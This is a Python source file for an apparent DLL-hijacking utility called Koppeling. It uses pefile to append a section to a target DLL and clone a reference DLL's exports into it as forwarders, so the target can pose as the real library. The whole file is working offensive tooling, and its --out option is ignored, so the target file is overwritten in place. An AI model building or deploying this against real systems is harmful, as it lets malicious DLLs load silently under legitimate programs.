import sys, os
import argparse
import pefile
import copy

# Read_Only | Initialized_Data
from config.Config import Config
from utils.console import Console

DEFAULT_CHARACTERISTICS = 0x40000040
SECTION_NAME = 8


class Koppeling:

    def __init__(self):
        self.debug = Config().get_boolean("DEBUG", "utilities")

    def align_up(self, value, align=0x1000):
        return (value + align - 1) & ~(align - 1)

    def add_section(self, pe, name, size, characteristics=DEFAULT_CHARACTERISTICS):
        # Sanity checks

        if len(name) > SECTION_NAME:
            raise Exception('[!] Section name is too long')

        section_header_size = pefile.Structure(pefile.PE.__IMAGE_SECTION_HEADER_format__).sizeof()
        section_header_off = pe.sections[-1].get_file_offset() + section_header_size
        if section_header_off + section_header_size > pe.OPTIONAL_HEADER.SizeOfHeaders:
            raise Exception('[!] Not enough room for another SECTION_HEADER')

        # Calculate/Align sizes
        virtual_size = self.align_up(size, pe.OPTIONAL_HEADER.SectionAlignment)
        virtual_addr = self.align_up(
            pe.sections[-1].VirtualAddress + pe.sections[-1].Misc_VirtualSize,
            pe.OPTIONAL_HEADER.SectionAlignment
        )

        raw_size = self.align_up(size, pe.OPTIONAL_HEADER.FileAlignment)
        raw_ptr = self.align_up(
            pe.sections[-1].PointerToRawData + pe.sections[-1].SizeOfRawData,
            pe.OPTIONAL_HEADER.FileAlignment
        )

        # Configure section properties
        section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__, pe=pe)
        section.set_file_offset(section_header_off)
        section.Name = name.encode().ljust(SECTION_NAME, b'\x00')
        section.VirtualAddress = virtual_addr
        section.PointerToRawData = raw_ptr
        section.Misc = section.Misc_VirtualSize = virtual_size
        section.SizeOfRawData = raw_size
        section.Characteristics = characteristics

        section.PointerToRelocations = 0
        section.NumberOfRelocations = 0
        section.NumberOfLinenumbers = 0
        section.PointerToLinenumbers = 0

        # Correct headers
        pe.FILE_HEADER.NumberOfSections += 1
        pe.OPTIONAL_HEADER.SizeOfImage = virtual_addr + virtual_size

        # Add buffer padding
        pe.__data__ += b'\x00' * raw_size

        # Append to ensure overwrite
        pe.__structures__.append(section)

        # Recreate to save our changes
        pe = pefile.PE(data=pe.write())

        return pe, section

    def _clone_exports(self, tgt, ref, ref_path, new_section_name='.rdata2'):
        # Forwards don't typically supply the extension
        ref_path = ref_path.replace('.dll', '')

        ref = copy.deepcopy(ref)
        tgt = copy.deepcopy(tgt)

        tgt_export_dir = tgt.OPTIONAL_HEADER.DATA_DIRECTORY[0]
        ref_export_dir = ref.OPTIONAL_HEADER.DATA_DIRECTORY[0]

        if not ref_export_dir.Size:
            raise Exception('Reference binary has no exports')

        exp_names = [
            ref_path.encode() + b'.' + e.name
            if e.name else ref_path.encode() + b'.#' + str(e.ordinal).encode()
            for e in sorted(ref.DIRECTORY_ENTRY_EXPORT.symbols, key=lambda x: x.ordinal)
        ]
        exp_names_blob = b'\x00'.join(exp_names) + b'\x00'

        new_section_size = ref_export_dir.Size + len(exp_names_blob)

        tgt, section = self.add_section(tgt, new_section_name, new_section_size)
        final_rva = section.VirtualAddress

        # Capture the reference export directory
        export_dir = ref.__unpack_data__(
            pefile.PE.__IMAGE_EXPORT_DIRECTORY_format__,
            ref.get_data(
                ref_export_dir.VirtualAddress,
                pefile.Structure(pefile.PE.__IMAGE_EXPORT_DIRECTORY_format__).sizeof()
            ),
            file_offset=0  # we don't need this
        )

        # Calculate our delta
        delta = final_rva - ref_export_dir.VirtualAddress

        # Apply RVA delta to export names
        for i in range(export_dir.NumberOfNames):
            ref.set_dword_at_rva(
                export_dir.AddressOfNames + 4 * i,
                ref.get_dword_at_rva(export_dir.AddressOfNames + 4 * i) + delta
            )

        # Link function addresses to forward names
        forward_offset = ref_export_dir.VirtualAddress + ref_export_dir.Size + delta
        true_offset = 0

        for i in range(export_dir.NumberOfFunctions):

            if not ref.get_dword_at_rva(export_dir.AddressOfFunctions + 4 * i):
                continue  # This function is hollow (never used)

            forward_name = exp_names[true_offset]
            ref.set_dword_at_rva(
                export_dir.AddressOfFunctions + 4 * i,
                forward_offset
            )
            forward_offset += len(forward_name) + 1  # +1 for null byte
            true_offset += 1

        # Apply RVA delta to directory
        export_dir.AddressOfFunctions += delta
        export_dir.AddressOfNames += delta
        export_dir.AddressOfNameOrdinals += delta

        # Write in our new export directory
        tgt.set_bytes_at_rva(
            final_rva,
            ref.get_data(ref_export_dir.VirtualAddress, ref_export_dir.Size) + exp_names_blob
        )
        tgt.set_bytes_at_rva(
            final_rva,
            export_dir.__pack__()
        )

        # Rebuild from bytes to save back
        tgt = pefile.PE(data=tgt.__data__)

        # Update directory specs
        tgt_export_dir = tgt.OPTIONAL_HEADER.DATA_DIRECTORY[0]
        tgt_export_dir.VirtualAddress = section.VirtualAddress
        tgt_export_dir.Size = new_section_size
        tgt = pefile.PE(data=tgt.write())

        return tgt

    def clone_exports(self, source, destination, path=None, section_name=".rdata2"):
        if not path:
            path = source
        with open(destination, "rb") as d:
            target_pe = pefile.PE(data=d.read())

        with open(source, "rb") as s:
            reference_pe = pefile.PE(data=s.read())
        if self.debug:
            Console.auto_line('[+] Loaded files')

        cloned_pe = self._clone_exports(target_pe, reference_pe, path, section_name)

        cloned_bytes = cloned_pe.write()
        open(destination, 'wb').write(cloned_bytes)
        if self.debug:
            Console.auto_line('[+] Done: {}'.format(destination))


def main(arguments):
    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('target', help="Target DLL for modifications")
    parser.add_argument('reference', help="Reference DLL from which the exports will be cloned")
    parser.add_argument('-o', '--out', help="Output file path (Default = <target>.clone.dll)", default=None)
    parser.add_argument('-p', '--path',
                        help="Full path to reference DLL while being hijacked (if <reference> is not accurate)",
                        default=None)
    parser.add_argument('-s', '--section-name', help="New section name (Default = .rdata2)", default=".rdata2")
    args = parser.parse_args(arguments)

    koppeling = Koppeling()

    if not args.path:
        args.path = args.reference

    if not args.out:
        args.out = args.target + '.clone.dll'

    koppeling.clone_exports(args.reference, args.target, args.path, args.section_name)


if __name__ == '__main__':
    sys.exit(main(sys.argv[1:]))
